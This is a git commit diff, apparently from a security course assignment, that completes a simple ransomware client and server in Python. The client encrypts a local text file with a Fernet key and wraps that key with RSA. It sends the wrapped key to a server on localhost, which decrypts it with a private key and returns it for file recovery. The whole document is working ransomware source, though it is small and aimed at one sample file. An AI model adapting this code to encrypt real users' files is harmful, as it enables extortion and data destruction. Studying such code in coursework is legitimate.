e8b12eaaf25b936819e49f0786888d81dd0e7985
LemonSauc3 <riley@boyder.ca>
2023-02-12 22:38:13 -0500

    Working Code for A1

--- ransom_client.py
+++ ransom_client.py
@@ -1,7 +1,7 @@
 # Cryptography imports for encrypting the keys
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 
@@ -20,8 +20,8 @@ FernetInstance = Fernet(symmetricKey)
 # Opening the public_key to load into memory
 with open("./keys/public_key.key", "rb") as key_file:
     public_key = serialization.load_pem_public_key(
-    key_file.read(),
-    backend=default_backend()
+        key_file.read(),
+        backend=default_backend()
     )
 
 # Creating an encryptedSymmetricKey with the public_key for encryption
@@ -32,30 +32,43 @@ encryptedSymmetricKey = public_key.encrypt(
         mgf=padding.MGF1(algorithm=hashes.SHA256()),
         algorithm=hashes.SHA256(),
         label=None
-        )
     )
+)
 
 # Opening or creating the encrypted key file and writing the encryption to
 # it, reading the Fernet Instance and writing the data
 with open("./keys/encryptedSymmertricKey.key", "wb") as key_file:
     key_file.write(encryptedSymmetricKey)
-
     filePath = "./ransomware/SecretTextFile.txt"
 
     with open(filePath, "rb") as file:
         file_data = file.read()
+        print(file_data)
         encrypted_data = FernetInstance.encrypt(file_data)
 
     with open(filePath, "wb") as file:
         file.write(encrypted_data)
 
 
-def sendEncryptedKey(eKeyFilePath):
-    with socket.create_connection(("", 8000)) as sock:
-        with open(eKeyFilePath, "rb") as file:
-            pass
-
 def decryptFile(filePath, key):
-    pass
+    FernetInstance = Fernet(key)
+    with open(filePath, "rb") as d_file:
+        file_data = d_file.read()
+        decrypted_data = FernetInstance.decrypt(file_data)
 
+    with open("./ransomware/decryptedTextFile.txt", "wb") as file:
+        file.write(decrypted_data)
+
+
+def sendEncryptedKey(eKeyFilePath):
+    with socket.create_connection(("127.0.0.1", 8000)) as sock:
+        with open(eKeyFilePath, "rb") as file:
+            file_data = file.read()
+            sock.send(file_data)
+            decryptedSymmetricKey = sock.recv(1024).strip()
+            decryptFile("./ransomware/SecretTextFile.txt",
+                        decryptedSymmetricKey)
+
+
+sendEncryptedKey("./keys/encryptedSymmertricKey.key")
 quit()
--- ransom_server.py
+++ ransom_server.py
@@ -1,26 +1,55 @@
+# Cryptography imports for encrypting the keys
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.fernet import Fernet
+
+# Importing socketserver to create the server aspect for TCP/IP
 import socketserver
+
+# Using Fetnet to generate a token for the key
+symmetricKey = Fernet.generate_key()
+FernetInstance = Fernet(symmetricKey)
+
 
 class ClientHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
         encrypted_key = self.request.recv(1024).strip()
-        print(f"Implement decryption of data {encrypted_key}")
+        print(f"Implement decryption of data {encrypted_key}\n")
 
-        #-----------------------------
+        # -----------------------------
         # Decryption Code Here
 
+        # Opening the private_key to load into memory
+        with open("./keys/pub_priv_pair.key", "rb") as key_file:
+            private_key = serialization.load_pem_private_key(
+                key_file.read(),
+                password=None,
+                backend=default_backend()
+            )
+        # Decrypting the symmetric key
+        decryptedSymmetricKey = private_key.decrypt(
+            encrypted_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
 
-
-        #-----------------------------
-
-        self.request.sendall("Send key back")
+        # -----------------------------
+        # Send the decrypted symmetric key back to the client
+        self.request.sendall(decryptedSymmetricKey)
 
 
 if __name__ == "__main__":
-    HOST, PORT = "", 8000
+    HOST, PORT = "127.0.0.1", 8000
 
     tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
     try:
         tcpServer.serve_forever()
     except:
         print("There was an error")
+        tcpServer.shutdown()
